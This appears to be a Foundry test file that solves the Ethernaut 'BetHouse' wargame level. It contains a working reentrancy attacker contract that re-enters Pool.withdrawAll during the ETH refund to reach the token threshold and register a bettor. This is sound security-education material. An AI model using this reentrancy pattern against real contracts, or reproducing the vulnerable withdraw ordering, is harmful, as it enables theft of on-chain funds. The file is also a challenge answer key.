// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {BetHouse, Pool, PoolToken} from "../src/levels/BetHouse.sol";

/// Ethernaut "BetHouse" → CEI-violation reentrancy in Pool.withdrawAll
/// (catalog: `cei-reentrancy`).
///
/// `makeBet` requires the caller to hold >= 20 wrapped tokens AND be locked. A player only gets
/// 10 (one-time ETH deposit) + 5 (their PDT) = 15. But `withdrawAll` refunds ETH via `.call`
/// BEFORE burning the caller's wrapped balance, and `deposit` is not reentrancy-guarded — so in the
/// refund callback the attacker re-deposits the just-returned PDT (15 -> 20 wrapped), locks, and
/// calls `makeBet(player)` while still holding 20, all before the burn.
///
/// Win: BetHouse.isBettor(player) == true.
contract BetHouseTest is Test {
    address player = makeAddr("player");

    function test_solve_betHouse() public {
        // ---- replicate the factory's createInstance ----
        PoolToken wrapped = new PoolToken("PoolWrappedToken", "PWT");
        PoolToken deposit = new PoolToken("PoolDepositToken", "PDT");
        Pool pool = new Pool(address(wrapped), address(deposit));
        BetHouse house = new BetHouse(address(pool));
        deposit.mint(player, 5);
        wrapped.transferOwnership(address(pool));
        deposit.transferOwnership(address(pool));

        // ---- exploit ----
        BetHouseAttacker attacker = new BetHouseAttacker(pool, house, deposit, player);
        vm.prank(player);
        deposit.transfer(address(attacker), 5); // hand the player's 5 PDT to the attacker
        vm.deal(address(attacker), 0.001 ether); // for the one-time ETH deposit
        attacker.attack();

        assertTrue(house.isBettor(player), "player registered as bettor");
    }
}

contract BetHouseAttacker {
    Pool pool;
    BetHouse house;
    PoolToken pdt;
    address player;
    bool entered;

    constructor(Pool _pool, BetHouse _house, PoolToken _pdt, address _player) {
        pool = _pool;
        house = _house;
        pdt = _pdt;
        player = _player;
    }

    function attack() external {
        pdt.approve(address(pool), type(uint256).max);
        pool.deposit{value: 0.001 ether}(5); // 10 (ETH) + 5 (PDT) = 15 wrapped
        pool.withdrawAll(); // refunds PDT + ETH; the ETH .call re-enters us before the burn
    }

    receive() external payable {
        if (entered) return;
        entered = true;
        // We now hold the refunded 5 PDT; wrapped (15) is not burned yet.
        pool.deposit(5); // +5 -> 20 wrapped (not locked, so deposit is allowed)
        pool.lockDeposits();
        house.makeBet(player); // balanceOf(this)==20 && locked -> bettors[player]=true
    }
}
